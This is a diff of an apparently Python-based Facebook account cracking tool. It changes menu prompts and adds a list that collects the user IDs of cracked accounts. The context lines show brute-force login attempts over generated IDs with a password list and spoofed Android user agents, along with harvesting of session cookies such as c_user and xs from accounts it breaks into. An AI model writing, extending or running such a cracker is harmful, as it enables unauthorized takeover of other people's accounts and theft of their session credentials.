@@ -101,6 +101,7 @@ fbmf = device['fbmf']
 fbbd = device['fbbd']
 fbdm = device['fbdm']
 uge = []
+bkas = []
 for xd in range(50000):
     aa='Mozilla/5.0 (Linux; Android'
     b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
@@ -234,6 +235,7 @@ def cek_apk(session,coki):
 loop = 0
 oks = []
 gen = []
+bkas = []
 cyan="\033[1;36m"
 faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 logo = (f"""
@@ -297,8 +299,8 @@ def lumd():
         
 def m():
     os.system('clear');print(logo)
-    print(f'{Y}[{W}1{Y}] {W}HOST 1 [Web]')
-    print(f'{Y}[{W}2{Y}] {W}HOST 2 [IOS]')
+    print(f'{Y}[{W}1{Y}] {W}HOST 1 ')
+    print(f'{Y}[{W}2{Y}] {W}HOST 2 ')
     print(47*"—")
     m = input(f'{Y}[{W}?{Y}] {W}Choose Method : ')
     if m == '1':
@@ -309,11 +311,11 @@ def m():
 def main():
     os.system('clear')
     print(logo)
-    code = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
+    code = input(f"{Y}[{W}~{Y}] {G}CHOICE CODE {W}: ")
     #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
     #code = random.choice([code1,code2,code3])
-    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
+    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL LIMID {W}: ')
     for a in range(int(limit)):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
@@ -429,8 +431,8 @@ def cracker(ids,passlist):
 def mainn():
     os.system('clear')
     print(logo)
-    code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ') 
-    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
+    code = input(f'{Y}[{W}~{Y}] {G}CHOICE CODE {W}: ') 
+    limit = input(f'{Y}[{W}~{Y}] {G}TOTAL LIMIT id {W}: ')
     for a in range(int(limit)):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
@@ -450,7 +452,7 @@ def convert(cookie):
     return(str(cok))            
 
 def crackerr(ids,passlist):
-    global loop,oks,cps
+    global loop,oks,cps,bkas
     session = requests.Session()
     sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
@@ -516,6 +518,7 @@ def crackerr(ids,passlist):
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
+                bkas.append(user)
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
